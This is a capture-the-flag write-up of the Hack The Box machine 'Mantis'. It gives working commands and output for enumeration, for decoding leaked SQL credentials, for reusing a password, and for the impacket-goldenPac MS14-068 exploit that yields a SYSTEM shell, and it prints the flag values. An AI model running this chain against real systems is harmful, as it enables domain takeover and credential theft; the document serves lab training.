# Target
| Category          | Details                                                                                                                                                                                          |
|-------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Mantis](https://app.hackthebox.com/machines/Mantis)                                                                                                                                             |  
| 🏷 **Type**       | HTB Machine                                                                                                                                                                                      |
| 🖥 **OS**         | Windows                                                                                                                                                                                          |
| 🎯 **Difficulty** | Hard                                                                                                                                                                                             |
| 📁 **Tags**       | web enumeration, password reuse, [CVE-2014-6324](https://nvd.nist.gov/vuln/detail/CVE-2014-6324), [MS14-068](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068) |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 11:01 +0200
Nmap scan report for 10.129.4.42
Host is up (0.034s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-05-25 09:02:52Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msdfsr?
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
49170/tcp open  unknown
49179/tcp open  unknown
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   NetBIOS computer name: MANTIS\x00
|   Workgroup: HTB\x00
|_  System time: 2026-05-25T05:03:48-04:00
|_clock-skew: 4h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.91 seconds
```

#### Enumerate target with `enum4linux-ng`
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ enum4linux-ng $TARGET
<SNIP>
 =========================================================
|    Domain Information via SMB session for 10.129.4.42    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: MANTIS                                                                                                                                                                       
NetBIOS domain name: HTB                                                                                                                                                                            
DNS domain: htb.local                                                                                                                                                                               
FQDN: mantis.htb.local                                                                                                                                                                              
Derived membership: domain member                                                                                                                                                                   
Derived domain: HTB
<SNIP>
 =============================================
|    OS Information via RPC for 10.129.4.42    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows Server 2008 R2 Standard 7601 Service Pack 1                                                                                                                                             
OS version: '6.1'                                                                                                                                                                                   
OS release: ''                                                                                                                                                                                      
OS build: '7601'                                                                                                                                                                                    
Native OS: Windows Server 2008 R2 Standard 7601 Service Pack 1                                                                                                                                      
Native LAN manager: Windows Server 2008 R2 Standard 6.1                                                                                                                                             
Platform id: null                                                                                                                                                                                   
Server type: null                                                                                                                                                                                   
Server type string: null
<SNIP>
```

#### Add `mantis.htb.local` and `htb.local` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ echo "$TARGET mantis.htb.local htb.local" | sudo tee -a /etc/hosts 
10.129.4.42 mantis.htb.local htb.local
```

#### Enumerate webserver running at port 1337
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ feroxbuster -u http:/mantis.htb.local:1337   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -n -C 404 -t 10
<SNIP>
301      GET        2l       10w      161c http://mantis.htb.local:1337/secure_notes => http://mantis.htb.local:1337/secure_notes/
<SNIP>
```

#### List content of `/secure_notes`
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ w3m -dump http://mantis.htb.local:1337/secure_notes/
mantis.htb.local - /secure_notes/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[To Parent Directory]

 9/13/2017  5:22 PM          912 dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
  9/1/2017 10:13 AM          168 web.config

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

#### List content of `/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ curl http://mantis.htb.local:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt 
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
<SNIP>
Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```
Content of this file might suggest that the name of this file contains MSSQL server credentials.

#### Decode filename
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ echo -n "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d         
6d2424716c5f53405f504073735730726421                                                                                                                                                                                                    
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ echo "6d2424716c5f53405f504073735730726421" | xxd -r -p               
m$$ql_S@_P@ssW0rd!
```

#### Use encoded password to access target over MSSQL
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ impacket-mssqlclient sa:'m$$ql_S@_P@ssW0rd!'@mantis.htb.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'sa'.
                                                                                                                                                                                                    
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ impacket-mssqlclient admin:'m$$ql_S@_P@ssW0rd!'@mantis.htb.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL (admin  admin@master)> 
```

#### List databases
```
SQL (admin  admin@master)> enum_db
name        is_trustworthy_on   
---------   -----------------   
master                      0   

tempdb                      0   

model                       0   

msdb                        1   

orcharddb                   0 
```

#### Switch to `orcharddb` database
```
SQL (admin  admin@master)> use orcharddb
ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.
```

#### List all tables
```
SQL (admin  admin@orcharddb)> SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
table_name                                             
----------------------------------------------------   
<SNIP>
blog_Orchard_Users_UserPartRecord                 
<SNIP>
```

#### List credentials
```
SQL (admin  admin@orcharddb)> SELECT UserName, Email, Password FROM blog_Orchard_Users_UserPartRecord;
UserName   Email             Password                                                               
--------   ---------------   --------------------------------------------------------------------   
admin                        AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   

James      james@htb.local   J@m3s_P@ssW0rd!
```

#### Confirm Orchard CMD credentials for user `james` has been resued
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ netexec smb mantis.htb.local -u james -p 'J@m3s_P@ssW0rd!'         
SMB         10.129.4.42     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.4.42     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 
```

#### Exploit [CVE-2014-6324](https://nvd.nist.gov/vuln/detail/CVE-2014-6324) to gain access as `SYSTEM` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Mantis]
└─$ impacket-goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file QukWcMHx.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service LjcE on mantis.htb.local.....
[*] Starting service LjcE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

#### Capture user flag
```
C:\Windows\system32>type C:\Users\james\Desktop\user.txt
d9ea2cc0ce880a78992108d0f315e17f
```

### Root flag

#### Capture root flag
```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
ee196d9fb25fdea01fc4708f7b9cdf5a
```
